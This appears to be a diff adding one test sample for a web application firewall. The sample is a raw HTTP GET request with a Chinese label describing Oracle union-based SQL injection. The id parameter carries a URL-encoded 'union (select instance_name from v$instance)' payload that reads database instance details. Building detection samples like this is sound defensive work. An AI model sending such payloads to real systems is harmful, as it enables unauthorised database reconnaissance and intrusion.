@@ -1,0 +1,9 @@
+# SQL注入_GET_oracle_普通注入-06506294
+# 攻击者基于UNION查询，将"union (select instance_name from v$instance)"语句注入到 SQL 查询参数中，利用系统视图v$instance获取当前数据库实例信息。
+GET /?id=1%20union%20%28select%20instance_name%20from%20v$instance%29&bid=hd_tag_m8mv249l HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv249l
+RM-PRO-Token: 84329f148fa0116ca07f6f2f4371153e
+RM-PRO-Time: 1742808370811
+User-Agent: curl/7.83.1
+
